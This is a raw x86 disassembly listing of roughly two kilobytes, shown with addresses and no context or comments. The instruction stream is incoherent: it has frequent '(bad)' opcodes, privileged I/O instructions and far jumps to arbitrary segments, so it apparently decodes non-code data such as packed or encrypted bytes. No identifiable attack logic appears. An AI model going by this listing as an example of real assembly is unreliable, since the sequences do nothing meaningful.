  4031e7:	or     eax,0x386f8961
  4031ec:	cmp    eax,0xcc5a8b2a
  4031f1:	mov    ebx,edi
  4031f3:	lods   al,BYTE PTR ds:[esi]
  4031f4:	xor    ebp,ebx
  4031f6:	stos   BYTE PTR es:[edi],al
  4031f7:	and    al,cl
  4031f9:	fcom   DWORD PTR [ebx]
  4031fb:	pop    edx
  4031fc:	fcom   st(7)
  4031fe:	ja     0x403229
  403200:	or     esi,DWORD PTR [edx+esi*2-0x63]
  403204:	in     al,0xb1
  403206:	mov    bl,0x15
  403208:	and    ebp,DWORD PTR [ebx]
  40320a:	(bad)  
  40320b:	push   ebx
  40320c:	pop    esp
  40320d:	and    al,0x1f
  40320f:	popa   
  403210:	rep stos BYTE PTR es:[edi],al
  403212:	ret    
  403213:	shr    BYTE PTR [edi-0x3c786807],1
  403219:	push   esi
  40321a:	ret    0x905a
  40321d:	pop    es
  40321e:	js     0x40329e
  403220:	inc    ebx
  403221:	call   0xdf87:0xf87e6bf6
  403228:	ins    DWORD PTR es:[edi],dx
  403229:	pop    es
  40322a:	sbb    eax,0x2771ad8b
  40322f:	xchg   BYTE PTR [ecx-0x2a1c4d19],ah
  403235:	ficom  DWORD PTR [edx+0x5e]
  403238:	outs   dx,BYTE PTR ds:[esi]
  403239:	pop    eax
  40323a:	push   ebx
  40323b:	nop
  40323c:	cdq    
  40323d:	(bad)  
  40323e:	push   ebp
  40323f:	cli    
  403240:	push   cs
  403241:	and    DWORD PTR [esi],eax
  403243:	dec    edx
  403244:	call   0xcf625ff6
  403249:	(bad)  
  40324a:	and    eax,0xa7ef3526
  40324f:	mov    bh,0x56
  403251:	sbb    ebp,esi
  403253:	je     0x40324d
  403255:	pusha  
  403256:	cs dec edi
  403258:	mov    ah,0x4d
  40325a:	fldenv [eax-0x1f]
  40325d:	scas   eax,DWORD PTR es:[edi]
  40325e:	sbb    eax,0x560d541e
  403263:	sbb    al,0x4
  403265:	adc    al,0x8d
  403267:	icebp  
  403268:	popa   
  403269:	je     0x4032c6
  40326b:	into   
  40326c:	mov    ds:0x17448bd9,al
  403271:	sar    BYTE PTR [edx-0x5e4a1195],0x3b
  403278:	dec    esp
  403279:	mov    esp,0x571fdbff
  40327e:	lods   eax,DWORD PTR ds:[esi]
  40327f:	push   esp
  403280:	mov    ch,0x81
  403282:	push   cs
  403283:	arpl   di,bp
  403285:	dec    eax
  403286:	out    dx,al
  403287:	sti    
  403288:	stc    
  403289:	lods   eax,DWORD PTR ds:[esi]
  40328a:	pop    ds
  40328b:	imul   eax,DWORD PTR [eax],0xee94e12b
  403291:	and    DWORD PTR [esi],0xbe5c3996
  403297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403298:	es push 0x24af157a
  40329e:	xor    cl,BYTE PTR [ecx]
  4032a0:	(bad)  
  4032a2:	xchg   ebp,eax
  4032a3:	jne    0x403263
  4032a5:	inc    edi
  4032a6:	std    
  4032a7:	pop    es
  4032a8:	icebp  
  4032a9:	std    
  4032aa:	mov    ds:0x21d7b2ee,al
  4032af:	mov    eax,0x81a1f328
  4032b4:	jae    0x403275
  4032b6:	iret   
  4032b7:	test   DWORD PTR [eax],esp
  4032b9:	jmp    0x707f6bb1
  4032be:	add    eax,0x6ea641ad
  4032c3:	cmp    ch,BYTE PTR [esp+eax*4-0x3422e957]
  4032ca:	repz sbb BYTE PTR [esi-0x1891ff91],bh
  4032d1:	xchg   edi,eax
  4032d2:	mov    ebp,0xf87cab81
  4032d7:	mov    dl,0x64
  4032d9:	add    ebx,DWORD PTR [ebp+0x795db04e]
  4032df:	popa   
  4032e0:	in     eax,dx
  4032e1:	in     al,dx
  4032e2:	mov    ebx,0xe9ed0813
  4032e7:	inc    esi
  4032e8:	cdq    
  4032e9:	ss dec esp
  4032eb:	jmp    0x73e9:0x33afe5d3
  4032f2:	or     edx,eax
  4032f4:	je     0x40330f
  4032f6:	cs pop es
  4032f8:	mov    esp,0x8eb76c7c
  4032fd:	retf   0x9cc4
  403300:	add    eax,0xdae4f1a7
  403305:	neg    BYTE PTR [esi]
  403307:	mov    ch,BYTE PTR [ecx+eiz*1+0xd]
  40330b:	jge    0x403297
  40330d:	ins    DWORD PTR es:[edi],dx
  40330e:	push   0xb3449b09
  403313:	(bad)  [ebx+0x5f]
  403316:	lea    ebx,[edx]
  403318:	call   0xa295:0x56f0bc92
  40331f:	push   ebp
  403320:	pop    edi
  403321:	into   
  403322:	pop    ds
  403323:	xor    edi,esi
  403325:	adc    cl,BYTE PTR [edx-0x73]
  403328:	xchg   edx,eax
  403329:	pop    edi
  40332a:	aaa    
  40332b:	jne    0x4032fe
  40332d:	adc    DWORD PTR [edx],ebp
  40332f:	call   0x473cb71
  403334:	iret   
  403335:	and    DWORD PTR [edi+ebx*2+0xcc5cd1f],0xffffffa9
  40333d:	mov    edx,0xa4c4de7a
  403342:	fimul  WORD PTR [ecx]
  403344:	dec    edx
  403345:	mov    ah,0x75
  403347:	mov    ch,0xdd
  403349:	push   ss
  40334a:	mov    ch,0x5a
  40334c:	out    dx,eax
  40334d:	sbb    DWORD PTR [ecx+ebp*4-0x7ede6dac],0x15940544
  403358:	out    0xd0,eax
  40335a:	jle    0x40339e
  40335c:	push   esp
  40335d:	(bad)  
  40335e:	dec    edx
  40335f:	(bad)  
  403361:	sahf   
  403362:	inc    ebx
  403363:	mov    edi,0xe35e95f9
  403368:	add    DWORD PTR [eax-0x36],esp
  40336b:	xchg   esi,eax
  40336c:	test   eax,0x6147d709
  403371:	mul    BYTE PTR [ebp-0x6a]
  403374:	retf   0x3201
  403377:	sbb    ecx,ebp
  403379:	pushf  
  40337a:	ss test eax,0x1e2415c5
  403380:	sub    ebx,DWORD PTR [eax-0x4]
  403383:	inc    edi
  403384:	jbe    0x403404
  403386:	dec    edx
  403387:	adc    ebp,DWORD PTR [esi-0x56]
  40338a:	retf   
  40338b:	les    eax,FWORD PTR [edi]
  40338d:	sub    BYTE PTR [ebp+0x2c],dh
  403390:	dec    ebp
  403391:	dec    esp
  403392:	ins    DWORD PTR es:[edi],dx
  403393:	adc    eax,0xebb2b297
  403398:	sub    ah,BYTE PTR [ebp-0x5fcdb4e4]
  40339e:	cmp    DWORD PTR [edi-0x2407bb24],0x51d7ceab
  4033a8:	mov    ds:0x64c61b9e,al
  4033ad:	(bad)  
  4033ae:	shl    BYTE PTR [edi],0xd9
  4033b1:	test   DWORD PTR [esi-0x66],edi
  4033b4:	xchg   BYTE PTR [edx+0x68a0b7e4],bh
  4033ba:	inc    esi
  4033bb:	pop    ds
  4033bc:	pop    di
  4033be:	jl     0x403367
  4033c0:	cmp    DWORD PTR [ebx],edi
  4033c2:	shl    DWORD PTR [ebp-0x5c],cl
  4033c5:	shr    BYTE PTR [edx],cl
  4033c7:	neg    DWORD PTR [edi+0x69]
  4033ca:	repz out dx,eax
  4033cc:	inc    edi
  4033cd:	std    
  4033ce:	dec    esi
  4033cf:	neg    ebp
  4033d1:	loopne 0x4033fc
  4033d3:	clc    
  4033d4:	dec    ebp
  4033d5:	cdq    
  4033d6:	ret    0x594d
  4033d9:	jns    0x4033cf
  4033db:	bound  ebx,QWORD PTR [edx]
  4033dd:	fld    TBYTE PTR [eax]
  4033df:	mov    al,ds:0x35bf854a
  4033e4:	ss xchg ebp,eax
  4033e6:	call   0x10aa:0x8cb9f95b
  4033ed:	test   eax,0x7f89b88c
  4033f2:	inc    eax
  4033f3:	fst    DWORD PTR [ecx+ecx*2]
  4033f6:	cli    
  4033f7:	xor    ecx,ebx
  4033f9:	sub    eax,0x3c3325a3
  4033fe:	call   0x2671bf37
  403403:	lods   al,BYTE PTR ds:[esi]
  403404:	popf   
  403405:	pop    ebx
  403406:	leave  
  403407:	mov    ?,WORD PTR [ecx]
  403409:	cmp    WORD PTR [edi+0x5b],0xe568
  40340f:	dec    esi
  403410:	fidiv  WORD PTR [ecx]
  403412:	cs add eax,0xb6aed069
  403418:	jmp    FWORD PTR [edi]
  40341a:	push   eax
  40341b:	xchg   DWORD PTR [edi-0x1b],eax
  40341e:	pop    eax
  40341f:	(bad)  
  403420:	das    
  403421:	cli    
  403422:	dec    ebp
  403423:	and    BYTE PTR [esi-0x65],dl
  403426:	outs   dx,BYTE PTR ds:[esi]
  403427:	pusha  
  403428:	xor    DWORD PTR [edi-0x636620e0],eax
  40342e:	inc    eax
  40342f:	aam    0x23
  403431:	or     esi,edx
  403433:	call   0x3152:0x61c3fd99
  40343a:	scas   al,BYTE PTR es:[edi]
  40343b:	xor    edi,edx
  40343d:	rol    BYTE PTR [edx+0x3f3be91c],1
  403443:	outs   dx,BYTE PTR ds:[esi]
  403444:	(bad)  
  403445:	out    0x17,al
  403447:	push   edi
  403448:	popf   
  403449:	inc    ebx
  40344a:	adc    DWORD PTR [ebx-0x4a1c0f4d],ebp
  403450:	js     0x4034b9
  403452:	jnp    0x40348d
  403454:	fstp   DWORD PTR [edi]
  403456:	mov    bh,0x6b
  403458:	sahf   
  403459:	mov    esp,0x3facb22e
  40345e:	cmc    
  40345f:	adc    DWORD PTR [ebx+eiz*4],0xc71dfef4
  403466:	and    BYTE PTR [ebx+0x52],cl
  403469:	(bad)  
  40346a:	sub    dl,BYTE PTR [ebp-0x59ca248e]
  403470:	popf   
  403471:	inc    eax
  403472:	adc    ecx,DWORD PTR [esi]
  403474:	loop   0x403487
  403476:	mov    eax,0x8fe2f57
  40347b:	push   ebx
  40347c:	or     al,0x95
  40347e:	lods   eax,DWORD PTR ds:[esi]
  40347f:	xor    eax,0xe34700c
  403484:	cmc    
  403485:	sti    
  403486:	jbe    0x4034d7
  403488:	pop    esp
  403489:	sub    eax,0xffffffe5
  40348c:	sbb    BYTE PTR [esi-0x2e],dl
  40348f:	and    BYTE PTR [ebp+0x39],bl
  403492:	jg     0x4034b1
  403494:	xor    ecx,esp
  403496:	sti    
  403497:	xchg   BYTE PTR [esi+ebx*4-0x39],al
  40349b:	xor    eax,DWORD PTR [esi+esi*2+0x22]
  40349f:	lods   eax,DWORD PTR ds:[esi]
  4034a0:	stc    
  4034a1:	cmp    al,ch
  4034a3:	into   
  4034a4:	mov    al,0x89
  4034a6:	push   0xffffffc6
  4034a8:	int    0x4f
  4034aa:	mov    ebx,0x39d2c498
  4034af:	fisttp WORD PTR [ebx+0xb]
  4034b2:	adc    eax,0x5282224e
  4034b7:	sar    BYTE PTR [esi+0x1e625f0a],cl
  4034bd:	cmp    BYTE PTR es:[esi],al
  4034c0:	push   cs
  4034c1:	jl     0x40350a
  4034c3:	repnz lods eax,DWORD PTR ds:[esi]
  4034c5:	jmp    0x40349a
  4034c7:	fsubr  QWORD PTR [ebx-0x55aecdb7]
  4034cd:	adc    eax,0xa53968a9
  4034d2:	repz pop edi
  4034d4:	inc    ecx
  4034d5:	pop    ebx
  4034d6:	mov    eax,0xe40c2b5
  4034db:	jge    0x403559
  4034dd:	loop   0x4034e6
  4034df:	and    BYTE PTR [ebp+0x1d61ea70],0x80
  4034e6:	push   cs
  4034e7:	fwait
  4034e8:	mov    cl,0x4a
  4034ea:	mov    al,0x5c
  4034ec:	aad    0x7d
  4034ee:	sub    edx,eax
  4034f0:	push   eax
  4034f1:	inc    BYTE PTR [ebp-0x15]
  4034f4:	mul    DWORD PTR ds:0xfebd17d2
  4034fa:	aaa    
  4034fb:	inc    ebx
  4034fc:	retf   
  4034fd:	popa   
  4034fe:	jb     0x403544
  403500:	dec    ebx
  403501:	cmp    eax,0x26ec6441
  403506:	test   BYTE PTR [esp+ecx*1],al
  403509:	sub    BYTE PTR [esi],dl
  40350b:	ror    eax,1
  40350d:	ret    0x75ae
  403510:	fs pop ds
  403512:	mov    eax,0x4c236f6c
  403517:	mov    dh,0x5
  403519:	sub    al,0x79
  40351b:	sub    edi,ebp
  40351d:	pusha  
  40351e:	xor    esi,DWORD PTR [esi+0x20]
  403521:	push   0xffffffbc
  403523:	jp     0x40358d
  403525:	call   0x53cb:0xc1bd2841
  40352c:	push   cs
  40352d:	pusha  
  40352e:	out    dx,al
  40352f:	mov    esi,0x22a3533b
  403534:	cmc    
  403535:	xor    eax,0xee67faee
  40353a:	repz rcl BYTE PTR [ecx-0x7],1
  40353e:	mov    ebp,0x41b92223
  403543:	sti    
  403544:	jno    0x4035b0
  403546:	repz jge 0x4035b1
  403549:	cmp    eax,0x52211786
  40354e:	pop    ss
  40354f:	mov    WORD PTR [ebx+0x617a05a5],gs
  403555:	out    dx,eax
  403556:	mov    dl,0x3c
  403558:	not    bh
  40355a:	adc    DWORD PTR [ebp+0x46],edx
  40355d:	dec    esi
  40355e:	or     al,0x23
  403560:	in     al,0xd0
  403562:	jmp    0xd520882d
  403567:	clc    
  403568:	dec    esp
  403569:	xchg   edx,eax
  40356a:	(bad)  
  40356b:	mov    eax,ds:0x6dcd8abe
  403570:	mov    bl,ah
  403572:	hlt    
  403573:	aam    0xff
  403575:	cmp    eax,0x2c234f7b
  40357a:	add    al,0xb1
  40357c:	fadd   QWORD PTR [esi-0x6e555d71]
  403582:	js     0x40357f
  403584:	or     edx,edx
  403586:	push   es
  403587:	stos   BYTE PTR es:[edi],al
  403588:	gs jns 0x40356d
  40358b:	fwait
  40358c:	les    eax,FWORD PTR [edi-0x2c]
  40358f:	fld    QWORD PTR [ebx]
  403591:	inc    edi
  403592:	add    edx,DWORD PTR [edx]
  403594:	adc    eax,0x48fce79d
  403599:	(bad)  
  40359b:	lahf   
  40359c:	sti    
  40359d:	mov    dl,0xf7
  40359f:	pop    DWORD PTR [esi*4-0x4892dfb9]
  4035a6:	enter  0xc74d,0x17
  4035aa:	adc    eax,DWORD PTR [ecx]
  4035ac:	add    esp,DWORD PTR [edi+0x2]
  4035af:	mov    al,ds:0x8157067
  4035b4:	das    
  4035b5:	xchg   esp,eax
  4035b6:	adc    esi,DWORD PTR [edi]
  4035b8:	repnz sub BYTE PTR [ecx+esi*2+0x4157536d],0xe9
  4035c1:	cmp    al,0xec
  4035c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035c4:	into   
  4035c5:	shl    BYTE PTR [eax],0x59
  4035c8:	(bad)  
  4035ca:	push   esp
  4035cb:	pop    ebx
  4035cc:	in     eax,0x9
  4035ce:	outs   dx,BYTE PTR ds:[esi]
  4035cf:	and    eax,0x21400017
  4035d4:	test   BYTE PTR [ebx+eiz*8],al
  4035d7:	aad    0x6a
  4035d9:	mov    edi,0xe131ce7f
  4035de:	jmp    0x403643
  4035e0:	xchg   ebx,eax
  4035e1:	pop    es
  4035e2:	ja     0x4035b5
  4035e4:	sar    BYTE PTR [ecx+eiz*1+0x3],0x61
  4035e9:	(bad)  
  4035eb:	shl    DWORD PTR [ebx],cl
  4035ed:	or     esi,esi
  4035ef:	in     al,dx
  4035f0:	scas   al,BYTE PTR es:[edi]
  4035f1:	fld    QWORD PTR [esi-0x67]
  4035f4:	daa    
  4035f5:	pop    esp
  4035f6:	or     ebp,DWORD PTR [esi+0x3a0fc3fd]
  4035fc:	call   0xf2b3:0xabd762f2
  403603:	inc    esp
  403604:	mov    esi,0x1477ae28
  403609:	push   esp
  40360a:	(bad)  
  40360b:	imul   ecx,DWORD PTR [esi-0x1],0x6a
  40360f:	cmc    
  403610:	aam    0x9e
  403612:	mov    ebp,0x28f53433
  403617:	xchg   ecx,eax
  403618:	sbb    eax,0x9e012794
  40361d:	sub    eax,0x42e39e5f
  403622:	lock sub ch,bl
  403625:	sub    esi,DWORD PTR [ebx+0x3c43a33f]
  40362b:	pop    ebp
  40362c:	add    DWORD PTR [esi-0xe],0x2d
  403630:	xchg   edi,eax
  403631:	push   edi
  403632:	mov    eax,0xec7ca7c7
  403637:	dec    edx
  403638:	(bad)  
  403639:	lahf   
  40363a:	stos   BYTE PTR es:[edi],al
  40363b:	sub    ebp,DWORD PTR [edi]
  40363d:	(bad)  
  40363f:	xchg   ecx,eax
  403640:	or     eax,esi
  403642:	push   ecx
  403643:	lods   eax,DWORD PTR ds:[esi]
  403644:	mov    ebx,DWORD PTR cs:[ebx-0x2e]
  403648:	mov    bl,0x59
  40364a:	ror    BYTE PTR [edx],1
  40364c:	fs or  eax,0x8883486a
  403652:	xchg   esp,eax
  403653:	push   edi
  403654:	js     0x403684
  403656:	jo     0x40363b
  403658:	test   eax,0x167a94a5
  40365d:	push   edx
  40365e:	loopne 0x4036a4
  403660:	sahf   
  403661:	ja     0x403654
  403663:	inc    ebx
  403664:	or     eax,0x9bf077ff
  403669:	cmp    bh,BYTE PTR [ecx]
  40366b:	dec    ecx
  40366c:	ret    
  40366d:	mov    BYTE PTR [edx],cl
  40366f:	dec    edx
  403670:	dec    ebp
  403671:	adc    al,BYTE PTR [ebx-0x47]
  403674:	idiv   ebx
  403676:	sbb    dl,ch
  403678:	jl     0x4036d2
  40367a:	sbb    edx,DWORD PTR [ebx+ebp*8]
  40367d:	stc    
  40367e:	or     DWORD PTR [esi+0x4f74e069],ebp
  403684:	xor    DWORD PTR [eax],edi
  403686:	mov    ebp,0x1a647220
  40368b:	jle    0x40364f
  40368d:	sahf   
  40368e:	(bad)  
  40368f:	call   0xaad6dc2e
  403694:	adc    al,0x16
  403696:	mov    ds:0x68027344,eax
  40369b:	adc    ch,BYTE PTR gs:[edx]
  40369e:	mov    al,bl
  4036a0:	pop    ss
  4036a1:	push   cs
  4036a2:	jno    0x4036e6
  4036a4:	icebp  
  4036a5:	xchg   edx,eax
  4036a6:	dec    ecx
  4036a7:	enter  0xafc3,0x54
  4036ab:	or     ebx,DWORD PTR [ecx-0x516b817a]
  4036b1:	sar    DWORD PTR [ebx+0x65e25637],1
  4036b7:	not    BYTE PTR [esi+0x7a]
  4036ba:	dec    edi
  4036bb:	dec    eax
  4036bc:	adc    esp,esp
  4036be:	outs   dx,BYTE PTR ds:[esi]
  4036bf:	jp     0x40366e
  4036c1:	popf   
  4036c2:	fsubrp st(1),st
  4036c4:	sbb    esi,DWORD PTR [eax-0x184a2aee]
  4036ca:	push   es
  4036cb:	mov    bl,0x2a
  4036cd:	call   0x223e82ee
  4036d2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d4:	mov    edi,0xced74284
  4036d9:	inc    esi
  4036da:	jne    0x403729
  4036dc:	int3   
  4036dd:	ret    0xb55e
  4036e0:	sbb    ch,dl
  4036e2:	add    DWORD PTR [eax-0x1e],esi
  4036e5:	xor    esp,DWORD PTR [ecx-0x64]
  4036e8:	inc    BYTE PTR [ecx]
  4036ea:	mov    al,ds:0x43e12631
  4036ef:	repnz adc edi,edx
  4036f2:	fdivr  DWORD PTR [eax-0x609b5c40]
  4036f8:	sbb    edx,esi
  4036fa:	aaa    
  4036fb:	retf   
  4036fc:	xchg   DWORD PTR [eax+0x9],eax
  4036ff:	or     dh,0xa7
  403702:	or     bl,0x60
  403705:	dec    esi
  403706:	fs jae 0x403757
  403709:	fcomi  st,st(7)
  40370b:	pusha  
  40370c:	mov    dl,0x4e
  40370e:	nop
  40370f:	sub    BYTE PTR [ecx+0x6],dh
  403712:	les    ecx,FWORD PTR [edx+0x182ec3c0]
  403718:	cmp    BYTE PTR [edx+0x15],ch
  40371b:	pop    esp
  40371c:	dec    eax
  40371d:	fbstp  TBYTE PTR [ebx+0x7b]
  403720:	ins    DWORD PTR es:[edi],dx
  403721:	hlt    
  403722:	aas    
  403723:	adc    DWORD PTR [esp+ecx*4],edx
  403726:	out    0x98,eax
  403728:	dec    edi
  403729:	out    0x49,al
  40372b:	mov    edi,0xe11571cd
  403730:	pop    es
  403731:	dec    edi
  403732:	into   
  403733:	inc    eax
  403734:	jg     0x403746
  403736:	mov    BYTE PTR [ecx],dl
  403738:	dec    eax
  403739:	mov    bh,BYTE PTR [edx]
  40373b:	hlt    
  40373c:	test   al,0x22
  40373e:	push   ds
  40373f:	and    DWORD PTR [ebp-0x4fc860e3],ebx
  403745:	aam    0x1f
  403747:	inc    esp
  403748:	xchg   edx,eax
  403749:	or     DWORD PTR [esp+eiz*8-0x23372897],0x13fd2d87
  403754:	or     eax,0x976a055f
  403759:	test   ah,0xd5
  40375c:	mov    ds:0x79c1aac0,eax
  403761:	ffreep st(1)
  403763:	add    cl,BYTE PTR [ecx+0x2fcf2063]
  403769:	inc    edx
  40376a:	ja     0x4037dc
  40376c:	ja     0x403746
  40376e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40376f:	data16 fisubr WORD PTR [esi+eiz*8+0xf2b5be0]
  403777:	inc    ebp
  403778:	call   0x3cebece1
  40377d:	mov    WORD PTR [eax-0x2c47eaa3],es
  403783:	jmp    0x403749
  403785:	add    eax,0xed56c7b0
  40378a:	mov    ds:0xd318a419,eax
  40378f:	mov    cl,0x67
  403791:	pop    edi
  403792:	sub    si,di
  403795:	mov    ebp,0x9e4132a2
  40379a:	and    bh,bh
  40379c:	xor    DWORD PTR cs:[eax-0x34],eax
  4037a0:	popf   
  4037a1:	mov    edi,0x14162730
  4037a6:	pop    ebp
  4037a7:	cli    
  4037a8:	lds    edx,FWORD PTR [ebp-0x28eb9309]
  4037ae:	sti    
  4037af:	adc    eax,0x714bd5dd
  4037b4:	jg     0x4037f9
  4037b6:	mov    ch,0x8e
  4037b8:	popa   
  4037b9:	dec    eax
  4037ba:	in     eax,dx
  4037bb:	xchg   ecx,ecx
  4037bd:	test   eax,0x4f6025fe
  4037c2:	xchg   ecx,eax
  4037c3:	fsubr  QWORD PTR [ebx-0x31b279b5]
  4037c9:	mov    dh,BYTE PTR [edx-0x7b]
  4037cc:	xchg   ecx,eax
  4037cd:	jno    0x40380b
  4037cf:	test   eax,0x60ab8432
  4037d4:	fiadd  DWORD PTR [esi-0x1b]
  4037d7:	mov    dl,0xdd
  4037d9:	inc    ah
  4037db:	mov    dh,0x66
  4037dd:	add    dl,dl
  4037df:	and    ecx,esp
  4037e1:	mov    ah,bh
  4037e3:	add    ch,BYTE PTR [eax+0x7572fb58]
  4037e9:	dec    esi
  4037ea:	and    DWORD PTR [eax-0x5f],esp
  4037ed:	mov    cl,0xc2
  4037ef:	sub    DWORD PTR [ebp-0x6c],edx
  4037f2:	mov    ebx,0xc7c824eb
  4037f7:	ficom  DWORD PTR [eax-0x3cb2bae6]
  4037fd:	sbb    eax,0xb0d1622e
  403802:	lods   al,BYTE PTR ds:[esi]
  403803:	push   0xc8db5892
  403808:	loopne 0x403792
  40380a:	adc    eax,0x8060b8ed
  40380f:	call   0x6709f04a
  403814:	fisub  WORD PTR [ebx]
  403816:	xor    al,0x47
  403818:	rcr    BYTE PTR [ebx+0x11f6b17],cl
  40381e:	or     al,0x3d
  403820:	add    BYTE PTR [edx+ebx*8],bl
  403823:	xchg   ebx,ebp
  403825:	leave  
  403826:	data16 adc BYTE PTR es:[eax+eiz*4-0x460877d9],cl
  40382f:	ins    BYTE PTR es:[edi],dx
  403830:	xlat   BYTE PTR ds:[ebx]
  403831:	mov    WORD PTR [edx-0x5bc09e5e],ss
  403837:	jl     0x403871
  403839:	or     bl,BYTE PTR ds:0x90991894
  40383f:	cs pushf 
  403841:	cmp    al,0x5e
  403843:	arpl   WORD PTR [edx+eax*4+0x6e],si
  403847:	mov    ebx,0x909635fe
  40384c:	les    ebx,FWORD PTR [ecx-0x3c698a77]
  403852:	(bad)  
  403853:	rcl    BYTE PTR [esi],1
  403855:	fs cld 
  403857:	cmp    eax,0x6f6bfa06
  40385c:	dec    eax
  40385d:	sar    cl,cl
  40385f:	lea    edi,[esi-0x43]
  403862:	mov    ebx,0xccb59f99
  403867:	inc    eax
  403868:	dec    ebx
  403869:	inc    esp
  40386a:	daa    
  40386b:	jp     0x4038e2
  40386d:	sub    DWORD PTR [ebx],ebp
  40386f:	cmp    dl,BYTE PTR [edx+ecx*4+0x6399dfe]
  403876:	loopne 0x40389c
  403878:	jge    0x40389a
  40387a:	adc    ebx,edi
  40387c:	adc    edx,DWORD PTR [eax+0x41b47e59]
  403882:	fisubr WORD PTR [ebp-0x687b3377]
  403888:	push   esp
  403889:	inc    edi
  40388a:	mov    ecx,0xe28ae0e7
  40388f:	dec    ebx
  403890:	pop    ss
  403891:	mov    edi,0x613c6e2c
  403896:	loop   0x403822
  403898:	popf   
  403899:	mov    ch,0xd4
  40389b:	rol    DWORD PTR [edi+0x1d1e302],1
  4038a1:	jb     0x403895
  4038a3:	je     0x4038a8
  4038a5:	jmp    0x3d587818
  4038aa:	jg     0x4038d9
  4038ac:	xchg   DWORD PTR [esi],eax
  4038ae:	iret   
  4038af:	clc    
  4038b0:	js     0x40391c
  4038b2:	push   ss
  4038b3:	in     eax,dx
  4038b4:	test   eax,0xa6062ade
  4038b9:	(bad)  [edi]
  4038bb:	dec    ebx
  4038bc:	retf   
  4038bd:	xchg   BYTE PTR [edx-0xef14bc8],dh
  4038c3:	imul   ebp,edi,0x57
  4038c6:	dec    ebp
  4038c7:	jecxz  0x40384b
  4038c9:	div    DWORD PTR [ebp+0x3ecd71a1]
  4038cf:	sub    DWORD PTR [ebp-0x49fb4f63],eax
  4038d5:	sbb    DWORD PTR [edi-0x37],eax
  4038d8:	popa   
  4038d9:	sbb    DWORD PTR ds:0x841a4196,ebx
  4038df:	and    DWORD PTR ds:0xf93e4299,ebp
  4038e5:	loopne 0x403870
  4038e7:	(bad)  
  4038e8:	(bad)  
  4038e9:	adc    edi,DWORD PTR [eax]
  4038eb:	mov    dl,BYTE PTR [ebx+eax*1-0x514c3e0c]
  4038f2:	cmc    
  4038f3:	loope  0x4038d9
  4038f5:	mov    ebp,0xa89e8080
  4038fa:	stc    
  4038fb:	test   BYTE PTR [eax-0x3fdc96b8],ch
  403901:	and    eax,DWORD PTR [esi+0x4f3956ca]
  403907:	xchg   edi,eax
  403908:	pusha  
  403909:	ins    DWORD PTR es:[edi],dx
  40390a:	out    dx,eax
  40390b:	lods   al,BYTE PTR ds:[esi]
  40390c:	outs   dx,DWORD PTR ds:[esi]
  40390d:	frstor [esi+0x4ccf14b9]
  403913:	les    ebx,FWORD PTR [edx+0x597f1511]
  403919:	jl     0x403930
  40391b:	scas   al,BYTE PTR es:[edi]
  40391c:	ret    0x1b41
  40391f:	sar    DWORD PTR [ebx],0x41
  403922:	jge    0x403940
  403924:	idiv   bl
  403926:	jmp    0x9c0590
  40392b:	test   eax,0x216385a0
  403930:	(bad)  
  403931:	pop    ebx
  403932:	and    eax,ebx
  403934:	scas   eax,DWORD PTR es:[edi]
  403935:	add    cl,0x74
  403938:	fdivr  QWORD PTR [ebp+0x48339a29]
  40393e:	sbb    eax,0x50bd2bf7
  403943:	push   cs
  403944:	sbb    BYTE PTR [esi+0x28],ah
  403947:	cmc    
  403948:	lods   al,BYTE PTR ds:[esi]
  403949:	xor    BYTE PTR [edi],bh
  40394b:	loope  0x403914
  40394d:	pop    esi
  40394e:	mov    eax,0x40e736e8
  403953:	and    al,0xa1
  403955:	sbb    eax,0x34459d72
  40395a:	cs push ebp
  40395c:	adc    BYTE PTR [eax+0x64],cl
  40395f:	adc    DWORD PTR [eax],ecx
  403961:	shl    dh,1
  403963:	aaa    
  403964:	pop    ebp
  403965:	in     eax,dx
  403966:	add    DWORD PTR [edi+eax*1],edx
  403969:	call   0x4570467b
  40396e:	es retf 0xc01f
  403972:	ja     0x403913
  403974:	and    eax,0xc6968a9b
  403979:	pop    edx
  40397a:	movq   mm1,mm1
  40397d:	jl     0x403941
  40397f:	les    esi,FWORD PTR [esi+0x52]
  403982:	out    dx,al
  403983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403984:	dec    eax
  403985:	cmp    eax,0xf4031dce
  40398a:	sub    eax,0x86d91a53
  40398f:	adc    al,0xc5
  403991:	dec    esi
  403992:	test   DWORD PTR [ecx+edx*4],ebx
  403995:	cmp    bl,ch
  403997:	mov    al,ds:0x399d2351
  40399c:	xchg   esi,eax
  40399d:	mov    DWORD PTR [ecx-0x25e5a233],esi
  4039a3:	xlat   BYTE PTR ds:[ebx]
  4039a4:	sbb    esp,DWORD PTR [ebx-0x63b13388]
  4039aa:	fnstsw WORD PTR [esi+0x2aef0d89]
  4039b0:	pop    ecx
  4039b1:	jp     0x403a2e
  4039b3:	cmc    
  4039b4:	xchg   esp,eax
  4039b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b6:	leave  
  4039b7:	sub    al,0x66
  4039b9:	xor    eax,esi
  4039bb:	fs cmp dh,bl
  4039be:	ret    0xe698
  4039c1:	mov    ds:0x7aa9f48d,eax
  4039c6:	out    dx,eax
  4039c7:	pop    ds
  4039c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039c9:	inc    ecx
  4039ca:	repz or DWORD PTR [edx-0x3e],edi
  4039ce:	or     al,0x55
  4039d0:	std    
  4039d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d2:	mov    eax,esp
  4039d4:	inc    ecx
  4039d5:	aad    0xf6
  4039d7:	xchg   esi,eax
  4039d8:	or     DWORD PTR [ebp-0x2ebb8973],edx
  4039de:	pop    ds
  4039df:	jne    0x403a4e
  4039e1:	jmp    0x40396c
  4039e3:	cmp    DWORD PTR [eax],esp
  4039e5:	daa    
  4039e6:	xchg   DWORD PTR [edx],eax
  4039e8:	nop
  4039e9:	retf   
  4039ea:	hlt    
  4039eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039ec:	les    esp,FWORD PTR [ecx+0x6da2ffc3]
  4039f2:	cmp    eax,esi
  4039f4:	ret    
  4039f5:	mov    esp,esi
  4039f7:	mov    ds:0x53931601,al
  4039fc:	icebp  
  4039fd:	sub    DWORD PTR [edx],esp
  4039ff:	xor    al,0x38
  403a01:	dec    ecx
  403a02:	adc    DWORD PTR [ebx],0x9388c13e
  403a08:	jb     0x403a84
